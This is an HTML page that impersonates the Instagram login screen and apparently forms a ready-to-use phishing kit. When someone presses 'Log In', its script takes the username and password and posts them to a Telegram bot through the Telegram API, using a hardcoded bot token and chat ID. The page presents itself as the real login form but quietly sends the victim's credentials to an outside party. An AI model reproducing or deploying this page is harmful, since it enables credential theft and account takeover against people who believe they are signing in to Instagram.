<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background-color: #fafafa;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 80px;
    }

    .login-box {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 300px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .logo {
      font-family: 'Billabong', cursive;
      font-size: 40px;
      margin-bottom: 24px;
      color: #262626;
    }

    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 8px;
      background-color: #3897f0;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 14px;
    }

    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #999;
    }
  </style>
</head>
<body>

  <div class="login-box">
    <div class="logo">Instagram</div>
    <input type="text" id="username" placeholder="Phone number, username, or email">
    <input type="password" id="password" placeholder="Password">
    <button onclick="sendToTelegram()">Log In</button>
  </div>

  <div class="footer">
    &copy; 2025 Instagram from Meta
  </div>

  <script>
    function sendToTelegram() {
      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();

      if (!username || !password) {
        alert("Please enter both username and password.");
        return;
      }

      const message = `üîê Instagram Login Attempt:\n\nüë§ Username: ${username}\nüîë Password: ${password}`;
      const botToken = "8001271576:AAFXKMoOR5JR8jDTklLVnrPaVi8zQ6utFsk";
      const chatId = "7094848924";

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(() => alert("‚úÖ Sent"))
      .catch(() => alert("‚ùå Failed to send"));
    }
  </script>

</body>
</html>
